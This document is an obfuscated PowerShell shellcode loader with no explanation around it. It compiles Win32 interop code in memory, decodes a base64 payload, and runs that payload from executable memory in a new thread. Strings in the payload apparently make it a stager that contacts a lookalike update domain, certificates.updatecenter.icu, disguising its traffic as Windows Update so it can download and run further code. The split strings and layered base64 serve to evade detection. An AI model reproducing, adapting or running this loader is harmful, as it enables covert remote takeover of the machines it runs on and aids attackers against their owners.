Set-StrictMode -Version 2

$di = @'
IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JGh5dWkgPSBAIgoJdXNpbmcgU3lzdGVtOwoJdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwoJbmFtZXNwYWNlIHBpa2wgewoJCXB1YmxpYyBjbGFzcyBqaXAgewoJCQlbRmxhZ3NdIHB1YmxpYyBlbnVtIEFsbG9jYXRpb25UeXBlIHsgQ29tbWl0ID0gMTQwOTYtMTAwMDAsIFJlc2VydmUgPSA4MTkwKzIgfQoJCQlbRmxhZ3NdIHB1YmxpYyBlbnVtIE1lbW9yeVByb3RlY3Rpb24geyBFeGVjdXRlUmVhZFdyaXRlID0gNjArNCB9CgkJCVtGbGFnc10gcHVibGljIGVudW0gVGltZSA6IHVpbnQgeyBJbmZpbml0ZSA9IDQyOTQ5NjcyOTQrMSB9CgkJCVtEbGxJbXBvcnQoImtlciIrIm5lbCIrIjMyLmQiKyJsbCIpXSBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jKEludFB0ciBscEFkZHJlc3MsIHVpbnQgZHdTaXplLCB1aW50IGZsQWxsb2NhdGlvblR5cGUsIHVpbnQgZmxQcm90ZWN0KTsKCQkJW0RsbEltcG9ydCgia2UiKyJybmVsMyIrIjIuZGwiKyJsIildIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVUaHJlYWQoSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywgdWludCBkd1N0YWNrU2l6ZSwgSW50UHRyIGxwU3RhcnRBZGRyZXNzLCBJbnRQdHIgbHBQYXJhbWV0ZXIsIHVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBUaHJlYWRJZCk7CgkJCVtEbGxJbXBvcnQoImsiKyJlcm4iKyJlbDMyLmRsIisibCIpXSBwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgV2FpdEZvclNpbmdsZU9iamVjdChJbnRQdHIgaEhhbmRsZSwgVGltZSBkd01pbGxpc2Vjb25kcyk7CgkJfQoJfQoiQA"+"==")));

$ck = New-Object Microsoft.CSharp.CSharpCodeProvider
$pl = New-Object System.CodeDom.Compiler.CompilerParameters
$pl.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$pl.GenerateInMemory = $True
$rz = $ck.CompileAssemblyFromSource($pl, $hyui)
[Byte[]]$vbn = [System.Convert]::FromBase64String(@(@("_OiJ:YInlMdJki1Iwi1IMi1IUi3IoD7dKJjH_McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH_McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH_4FhfWosS64ZdaG5ldABod2luaVRoTHcmB__V6:AAx_1dXV1dXaDpWeaf_1emk:WzHJUVFqA1FRaLsBAABTUGhXiZ_G_9VQ6YwAAABbMdJSaAAyoIRSUlJTUlBo61UuO__VicaDw1BogDMAAIngagRQah9WaHVGnob_1V8x_1dXav9TVmgtBhh7_9WFwA+EygEAADH_hfZ0BIn56wloqsXiXf_VicFoRSFeMf_VMf9XagdRVlBot1fgC__VvwAvAAA5x3UHWFDpe____zH_6ZEBAADpyQEAAOhv____L3YxMS81L3dpbmRvd3N1cGRhdGUvcmVkaXIvdjYtd2luODYtd3VyZWRpci5jYWI_aWQ9MTQ0MjU2MDAyMzUyMDEAk2x6nU_0GwnRmKRrkgBDb29raWU6IGluaXQ9MQ0KVXNlci1BZ2VudDogV2luZG93cy1VcGRhdGUtQWdlbnQNCgA3SMxzwUv4M1c2enpzf3MYM9EeucT78hW5tXns0QZnHe_IhC6+We66iY_CGMjniPSL3kRwPJ9gQBG7ugCthj0Mogzr6zoEzxkBps+xujB3HkENy0clAUGL89lJsxCIUQ8kMMcur9MQw3X5OS7VWv0OC5oJJmWjGGGUeyRi+4WLTcKwTETzg7GGgpYliaUTABJsfaNL6e8UB+2dC+uA5HGWxYwaw6TC3fn+hsgt5UZzQWTSTMnaDiKSw_cFtTQWxQBL0LXrRvrzQz19dwBzjcF6j9R6GCFvDkis7nuOm55MK8REqKk24FRm8WbpYyWxfNQMjQfg6TyFMXKbwSMAaPC1olb_1WpAaAAQAABoAABAAFdoWKRT5f_Vk7kE:AdlRU4nnV2gAIAAAU1ZoEpaJ4v_VhcB0xosHAcOFwHXlWMPoif3__2NlcnRpZmljYXRlcy51cGRhdGVjZW50ZXIuaWN1:AAA=" -replace ("_"),("/"))) -replace (":","AAAA"));
$op = "CSRiZmYgPSAoW3Bpa2_wuamlwXTo6VmlydHVhbEFsbG9jKDAsICR2Ym4uTGVuZ3RoICsgMSwgW3Bpa2wuamlwK0FsbG9jYXRpb2_5UeXBlXTo6UmVzZXJ2ZSAtYk9yIFtwaWtsLmppcCtBbGxvY2F0aW9uVHlwZV06OkNvbW1pdCwgW3B_pa2wuamlwK01lbW9yeVByb3RlY3Rpb25dOjp_FeGVjdXRlUmVhZFdyaXRlKSk7";
IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(@($op -replace ("_"),("")))));
if ([Bool]!$bff) {$global:rz = 3;return}
[System.Runtime.InteropServices.Marshal]::Copy($vbn, 0, $bff, $vbn.Length)
[IntPtr] $tr = [pikl.jip]::CreateThread(0+0, 1-1, $bff, -2+2, (13+1)/2-7, 0)
if ([Bool]!$tr) {$global:rz = 7; return }
$rz2 = [pikl.jip]::WaitForSingleObject($tr, [pikl.jip+Time]::Infinite)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $di | wait-job | Receive-Job
}
else {
	IEX $di
}
